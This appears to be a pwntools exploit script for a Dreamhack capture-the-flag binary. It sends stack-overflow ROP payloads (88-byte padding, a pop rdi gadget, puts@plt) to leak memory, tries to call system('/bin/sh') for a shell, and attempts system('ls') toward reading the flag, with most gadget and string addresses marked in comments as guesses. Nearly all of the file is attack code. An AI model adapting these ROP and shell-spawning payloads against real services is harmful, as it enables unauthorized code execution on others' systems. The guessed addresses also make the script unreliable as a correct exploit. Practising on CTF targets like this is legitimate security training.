#!/usr/bin/env python3

from pwn import *

HOST = 'host8.dreamhack.games'
PORT = 13646

def simple_puts_test():
    """매우 간단한 puts 테스트"""
    
    addresses_to_try = [
        ("String in .rodata", 0x402000),
        ("Program start", 0x401000),  
        ("puts@plt", 0x401030),
        ("main function", 0x401000),
        ("BSS section", 0x404000),
    ]
    
    for name, addr in addresses_to_try:
        try:
            print(f"\n[+] Testing {name} at 0x{addr:x}")
            r = remote(HOST, PORT)
            
            r.recvuntil(b"Your Input:", timeout=3)
            
            # 매우 간단한 ROP: puts(addr)
            pop_rdi = 0x4012c3    # pop rdi; ret (추정)
            puts_plt = 0x401030   # puts@plt (추정)
            
            payload = b"A" * 88
            payload += p64(pop_rdi)   # pop rdi; ret
            payload += p64(addr)      # argument
            payload += p64(puts_plt)  # call puts
            
            r.sendline(payload)
            
            # 더 오래 기다려보기
            response = r.recv(timeout=5)
            print(f"[+] Response length: {len(response)}")
            print(f"[+] Response: {repr(response)}")
            
            if len(response) > 1:
                print(f"[!] Got interesting response from {name}!")
                if b'DH{' in response:
                    print(f"[!] POTENTIAL FLAG FOUND: {response}")
            
            r.close()
            
        except Exception as e:
            print(f"[-] Failed {name}: {e}")

def system_call_test():
    """system() 호출 테스트"""
    
    try:
        print(f"\n[+] Testing system() call...")
        r = remote(HOST, PORT)
        
        r.recvuntil(b"Your Input:", timeout=3)
        
        # system("/bin/sh") 시도
        system_plt = 0x401040  # system@plt (추정)
        binsh_str = 0x402000   # "/bin/sh" 문자열 위치 (추정)
        pop_rdi = 0x4012c3
        
        payload = b"A" * 88
        payload += p64(pop_rdi)     # pop rdi; ret
        payload += p64(binsh_str)   # "/bin/sh"
        payload += p64(system_plt)  # system()
        
        r.sendline(payload)
        
        # 셸이 생겼는지 확인
        print("[+] Checking for system() response...")
        r.sendline(b"echo hello")
        
        response = r.recv(timeout=3)
        print(f"[+] System response: {repr(response)}")
        
        r.close()
        
    except Exception as e:
        print(f"[-] System test failed: {e}")

def flag_direct_read():
    """플래그 파일 직접 읽기 시도"""
    
    try:
        print(f"\n[+] Testing direct flag read...")
        r = remote(HOST, PORT)
        
        r.recvuntil(b"Your Input:", timeout=3)
        
        # cat flag 명령어 실행을 위한 ROP
        system_plt = 0x401040
        pop_rdi = 0x4012c3
        
        # "cat flag" 문자열을 스택에 배치
        # 일단 간단히 system("ls") 시도
        
        payload = b"A" * 88
        payload += p64(pop_rdi)
        payload += p64(0x402008)    # "ls" 문자열 위치 (추정)
        payload += p64(system_plt)
        
        r.sendline(payload)
        
        response = r.recv(timeout=3)
        print(f"[+] Direct read response: {repr(response)}")
        
        r.close()
        
    except Exception as e:
        print(f"[-] Direct read failed: {e}")

if __name__ == "__main__":
    print("=== Advanced Exploitation Tests ===")
    
    simple_puts_test()
    system_call_test()
    flag_direct_read()
